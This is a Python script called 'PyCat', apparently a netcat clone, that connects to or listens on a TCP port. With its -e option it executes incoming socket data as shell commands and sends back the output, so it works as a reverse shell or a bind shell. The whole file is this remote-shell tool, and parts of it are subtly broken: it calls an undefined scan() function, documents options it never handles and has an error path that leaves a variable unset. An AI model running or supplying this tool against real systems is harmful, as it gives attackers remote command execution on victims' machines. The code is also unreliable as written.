#!/usr/bin/python3

import sys
import socket
import getopt
import threading
import subprocess
import os
import struct

listen = False
execute = ''
target = ""
port = 0


def usage():

    print("Usage: PyCat.py -t target_host -p port")

    print("-h --help")
    print("Display this help message")

    print("-l --listen")
    print("Listen on [host]:[port] for incoming connections")

    print("-p --port")
    print("Port for the connections")

    print("-c --command")
    print("Command for execute after connect")

    print("-e --execute=file_to_run")
    print("Execute file upon connection")

    sys.exit(0)


def exec_command(command, exe):
    command = command.rstrip()

    try:
        if exe == 'cmd' or 'cmd.exe' in exe or exe == '/bin/bash':
            out = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)+'\n'.encode()
        else:
            out = subprocess.check_output([exe, command], stderr=subprocess.STDOUT, shell=True)+'\n'.encode()
            
    except:
        if sys.platform == 'win32':
            out = ("'%s' command not found\n" % command).encode()

    return out


def client_handler(client_socket, execute):
    if len(execute):
        i = 1
        while True:
            try:
                if i == 1:
                    client_socket.send("<Shell:#> ".encode())
                    i += 1
                    
                cmd_buffer = client_socket.recv(1024)

                _str = cmd_buffer.decode()
                if not len(_str):
                    out = '\n'
                else:
                    out = exec_command(_str, execute)

                client_socket.send(out + "<Shell:#> ".encode())

            except:
                print('Connection closed')
                quit()
            

    else:
        while True:
            try:
                data = client_socket.recv(1024)
            
                buffer = input(data.decode())
                if not len(buffer):
                    buffer = '\n'
                client_socket.send(buffer.encode())

            except:
                pass


def client_send(target, port, exe):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target, port))

        print('(UNKNOWN) [%s] %s : connection successfully' % (target, port))

        client_thread = threading.Thread(target=client_handler, args=(client, exe))
        client_thread.start()

    except:
        print('(UNKNOWN) [%s] %s : connection failed' % (target, port))

def server_loop(port, up, target, exe):
    if not len(target):
        target = "0.0.0.0"

    print('Listening on %s ...' % port)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    try:
        client_socket, addr = server.accept()

        print('(UNKNOWN) [%s] %s : connection successfully' % (addr[0], addr[1]))

        client_thread = threading.Thread(target=client_handler, args=(client_socket, exe))
        client_thread.start()

    except:
        pass


def main():
    global listen
    global port
    global execute
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        scan()

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu", [
                                   "help", "listen", "execute", "target", "port"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            pass

    if not listen and len(target) and port > 0:
        client_send(target, port, execute)

    if listen:
        server_loop(port, execute, target, execute)

main()
